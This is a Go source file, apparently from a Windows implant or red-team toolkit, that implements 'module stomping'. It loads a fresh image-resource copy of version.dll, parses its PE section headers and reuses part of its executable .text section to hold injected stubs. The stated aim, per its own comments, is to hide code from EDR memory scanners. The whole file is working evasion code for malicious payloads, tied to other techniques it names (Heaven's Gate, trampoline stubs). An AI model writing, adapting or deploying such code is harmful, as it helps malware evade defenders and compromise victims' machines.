//go:build windows
// +build windows

package evasion

// Module stomping — back HGProc and spoof-trampoline stubs with MEM_IMAGE
// pages rather than private RWX allocations.
//
// Private PAGE_EXECUTE_READWRITE allocations are a first-tier IOC for every
// major EDR: VirtualQuery returns Type=MEM_PRIVATE, Protect=PAGE_EXECUTE_READWRITE.
// By writing our stubs into a fresh mapped copy of a lightweight DLL the pages
// show Type=MEM_IMAGE and PAGE_EXECUTE_READ — identical to real loaded code.
//
// LOAD_LIBRARY_AS_IMAGE_RESOURCE always creates a fresh view, never returning
// an existing loaded module handle, so our writes never touch real DLL code.
// The first write to any shared page triggers copy-on-write (CoW), making
// the page private to our process while the MEM_IMAGE type marker stays intact.
//
// Only small stub allocations (≤ 256 bytes) are stomped; larger ones
// (e.g. the Heaven's Gate page) fall back to private VirtualAlloc.

import (
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	loadLibraryAsImageResource = 0x20

	stompMaxBytes = 0x1000 // 4 KB reserved from version.dll .text
	stompMaxAlloc = 256    // only stomp small stubs
)

var (
	stompOnce   sync.Once
	stompBase   uintptr
	stompEnd    uintptr
	stompCursor uintptr
	stompMu     sync.Mutex
)

func initStomp() {
	stompOnce.Do(func() {
		name, err := windows.UTF16PtrFromString("version.dll")
		if err != nil {
			return
		}
		// LOAD_LIBRARY_AS_IMAGE_RESOURCE: fresh view, never reuses a loaded module,
		// sections mapped as MEM_IMAGE (read-only until we CoW them).
		hmod, _, _ := modKernel32.NewProc("LoadLibraryExW").Call(
			uintptr(unsafe.Pointer(name)), 0, loadLibraryAsImageResource,
		)
		if hmod == 0 {
			return
		}
		// Bit 1 of the handle is set by the flag; mask it to get the image base.
		base := hmod &^ uintptr(2)

		e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
		peBase := base + uintptr(e_lfanew)
		numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
		optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))
		secBase := peBase + 24 + uintptr(optHeaderSize)
		const (
			sSize              = 40
			sVSizeOff          = 8
			sVAOff             = 12
			sCharOff           = 36
			imageScnMemExecute = 0x20000000
		)
		for i := uint16(0); i < numSections; i++ {
			sh := secBase + uintptr(i)*sSize
			if *(*uint32)(unsafe.Pointer(sh+sCharOff))&imageScnMemExecute == 0 {
				continue
			}
			va := *(*uint32)(unsafe.Pointer(sh + sVAOff))
			vsz := *(*uint32)(unsafe.Pointer(sh + sVSizeOff))
			if va == 0 || uintptr(vsz) < stompMaxBytes {
				continue
			}
			stompBase = base + uintptr(va)
			stompEnd = stompBase + stompMaxBytes
			stompCursor = stompBase
			return
		}
	})
}

// stompAlloc carves size bytes from the version.dll .text stomp arena and
// returns the address after setting it PAGE_EXECUTE_READWRITE for writing.
// Returns 0 when stomping is unavailable or size > stompMaxAlloc.
func stompAlloc(size uint32) uintptr {
	if size > stompMaxAlloc {
		return 0
	}
	initStomp()
	stompMu.Lock()
	defer stompMu.Unlock()
	aligned := (uintptr(size) + 0xF) &^ 0xF // 16-byte align
	if stompBase == 0 || stompCursor+aligned > stompEnd {
		return 0
	}
	addr := stompCursor
	stompCursor += aligned
	// VirtualProtect (not ntProtect) to avoid HGProc init deadlock:
	// ntProtect calls getNtProtectProc → NewHGProc → stompAlloc (recursive).
	var old uint32
	modKernel32.NewProc("VirtualProtect").Call(
		addr, uintptr(size),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&old)),
	)
	return addr
}

// stompFinalize flips a stomped region from RWX back to PAGE_EXECUTE_READ so
// no private RWX pages are visible to memory scanners after stub init.
// Uses kernel32!VirtualProtect directly (same reason as stompAlloc).
func stompFinalize(addr uintptr, size uint32) {
	var old uint32
	modKernel32.NewProc("VirtualProtect").Call(
		addr, uintptr(size),
		uintptr(windows.PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&old)),
	)
}
